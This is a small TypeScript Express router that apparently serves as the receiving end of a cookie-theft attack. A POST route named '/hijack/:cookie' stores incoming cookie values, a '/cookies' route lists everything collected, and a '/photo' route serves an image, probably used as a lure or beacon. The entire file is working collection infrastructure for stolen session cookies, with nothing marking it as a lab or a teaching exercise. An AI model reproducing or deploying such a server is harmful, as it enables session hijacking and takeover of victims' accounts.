import { Router, Request, Response } from 'express'
import { PostsController } from '../controllers/posts.controller'
import path from 'path'

const router = Router()

router.post('/hijack/:cookie', async (req: Request, res: Response) => {
    try {
        await PostsController.post(req)
        res.status(200).send()
    } catch (err) {
        res.status(500).send('Error Occured')
    }
})

router.get('/cookies', async (req: Request, res: Response) => {
    try {
        res.status(200).json(await PostsController.get())
    } catch (err) {
        res.status(500).send('Error Occured')
    }})

router.get('/photo', (req: Request, res: Response) => {
    res.sendFile(path.resolve(__dirname, '../../public/images/cookie.jpg'))
})

export default router
